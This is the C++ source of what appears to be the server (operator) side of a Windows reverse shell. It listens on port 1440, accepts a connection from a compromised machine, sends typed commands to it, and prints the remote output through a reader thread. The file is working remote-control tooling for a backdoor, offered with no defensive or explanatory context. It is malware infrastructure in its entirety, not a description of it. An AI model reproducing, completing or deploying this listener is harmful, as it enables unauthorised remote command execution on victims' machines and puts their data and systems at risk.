#include "ReverseShellServer.h"

#define MAX_INPUT_BUFFER 500
#define MAX_OUTPUT_BUFFER 4096

using namespace std;
bool running;
char inputUser[MAX_INPUT_BUFFER];

void SpawnShell()
{
	WSADATA wsadata;
	SOCKET sockServer, sockClient;
	SOCKADDR_IN sin;
	DWORD bytesReadFromPipe;
	int bytesReadFromSock;
	int sinLen = sizeof(SOCKADDR_IN);
	unsigned short port = 1440;

	//Socket Setup
	WSAStartup(MAKEWORD(2, 2), &wsadata);

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = 0;
	sin.sin_port = htons(port);

	sockServer = socket(AF_INET, SOCK_STREAM, 0);
	if (sockServer == SOCKET_ERROR)
		return;
	int yes = 1;
	setsockopt(sockServer, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(yes));
	::bind(sockServer, (SOCKADDR*)&sin, sizeof(sin));
	listen(sockServer, 0);
	sockClient = accept(sockServer, (SOCKADDR*)&sin, &sinLen);

	DWORD thId;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)readFromSocket, &sockClient, NULL, &thId);
	do
	{
		fgets(inputUser, MAX_INPUT_BUFFER, stdin);
		if (_strcmpi(inputUser, "cls\n") == 0 || _strcmpi(inputUser, "clear\n") == 0)
		{
			system("cls");
			cout << "$shell>";
			continue;
		}
		send(sockClient, inputUser, strlen(inputUser), NULL);

	} while (_strcmpi(inputUser, "exit\n") != 0);

	closesocket(sockServer);
	closesocket(sockClient);
	WSACleanup();

	return;
}


void readFromSocket(SOCKET& sock)
{
	int iResult;
	char outputBuffer[MAX_OUTPUT_BUFFER];;
	while (true)
	{

		iResult = recv(sock, outputBuffer, MAX_OUTPUT_BUFFER, 0);
		if (iResult == -1)
		{
			break;
		}

		if (iResult < 4096)
			outputBuffer[iResult] = '\0';
		if (_strcmpi(inputUser, outputBuffer) == 0)
			continue;
		cout << outputBuffer;
		fflush(stdout);
	}
}